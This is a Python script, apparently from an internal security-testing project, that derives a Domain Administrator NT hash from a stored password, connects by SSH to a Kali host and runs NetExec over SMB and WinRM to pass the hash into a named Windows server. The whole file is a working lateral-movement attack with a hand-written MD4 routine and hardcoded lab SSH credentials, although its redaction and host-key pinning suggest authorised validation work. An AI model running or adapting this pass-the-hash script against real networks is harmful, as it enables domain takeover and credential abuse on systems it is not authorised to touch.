"""Stage-2 validation: prove a Domain Admin NT hash pass-the-hashes into NMS (MaintServer) from Kali.
NT hash is computed on MC01 (plaintext never leaves this host); only the hash is sent to Kali.
Prints nxc result lines with the hash redacted."""
import asyncio, sys, struct
sys.path.insert(0, "backend")
import asyncssh  # noqa: E402
from pathlib import Path
sys.path.insert(0, "backend")
from app.core.credentials import CredentialStore  # noqa: E402

KALI = "10.5.20.50"
PIN = "SHA256:usPlqQ8/75/E6iXqsKrwmAzk7/69fUsC7X2+eecHoAA"
NMS = "192.168.30.11"


# --- minimal MD4 (NT hash = MD4(UTF-16LE(password))); stdlib hashlib may lack md4 on OpenSSL3 ---
def _lrot(x, n): return ((x << n) | (x >> (32 - n))) & 0xffffffff
def md4(msg: bytes) -> bytes:
    h = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476]
    ml = len(msg) * 8
    msg += b"\x80"
    while len(msg) % 64 != 56: msg += b"\x00"
    msg += struct.pack("<Q", ml)
    for off in range(0, len(msg), 64):
        X = list(struct.unpack("<16I", msg[off:off+64]))
        a, b, c, d = h
        def F(x, y, z): return (x & y) | (~x & z)
        def G(x, y, z): return (x & y) | (x & z) | (y & z)
        def H(x, y, z): return x ^ y ^ z
        for k in (0, 4, 8, 12):
            a = _lrot((a + F(b, c, d) + X[k]) & 0xffffffff, 3); d = _lrot((d + F(a, b, c) + X[k+1]) & 0xffffffff, 7)
            c = _lrot((c + F(d, a, b) + X[k+2]) & 0xffffffff, 11); b = _lrot((b + F(c, d, a) + X[k+3]) & 0xffffffff, 19)
        for k in (0, 1, 2, 3):
            a = _lrot((a + G(b, c, d) + X[k] + 0x5a827999) & 0xffffffff, 3); d = _lrot((d + G(a, b, c) + X[k+4] + 0x5a827999) & 0xffffffff, 5)
            c = _lrot((c + G(d, a, b) + X[k+8] + 0x5a827999) & 0xffffffff, 9); b = _lrot((b + G(c, d, a) + X[k+12] + 0x5a827999) & 0xffffffff, 13)
        for k in (0, 2, 1, 3):
            a = _lrot((a + H(b, c, d) + X[k] + 0x6ed9eba1) & 0xffffffff, 3); d = _lrot((d + H(a, b, c) + X[k+8] + 0x6ed9eba1) & 0xffffffff, 9)
            c = _lrot((c + H(d, a, b) + X[k+4] + 0x6ed9eba1) & 0xffffffff, 11); b = _lrot((b + H(c, d, a) + X[k+12] + 0x6ed9eba1) & 0xffffffff, 15)
        h = [(h[0]+a) & 0xffffffff, (h[1]+b) & 0xffffffff, (h[2]+c) & 0xffffffff, (h[3]+d) & 0xffffffff]
    return struct.pack("<4I", *h)


async def main() -> None:
    creds = CredentialStore.load(Path("config/credentials.example.yaml"))
    pw = creds.credential("np.local/Administrator").password
    nt = md4(pw.encode("utf-16-le")).hex()

    async with asyncssh.connect(KALI, username="kali", password="kali", known_hosts=None) as conn:
        import hashlib, base64
        key = conn.get_server_host_key()
        got = "SHA256:" + base64.b64encode(hashlib.sha256(key.public_data).digest()).decode().rstrip("=")
        assert got == PIN, f"HOST KEY MISMATCH {got}"
        for proto in ("smb", "winrm"):
            r = await conn.run(f"nxc {proto} {NMS} -u Administrator -H {nt} -d np.local --no-progress", check=False)
            out = ((r.stdout or "") + (r.stderr or "")).replace(nt, "<NTHASH>").strip()
            print(f"===== nxc {proto} {NMS} (PtH as NP\\Administrator) =====")
            print(out or "(no output)")
            print()


asyncio.run(main())
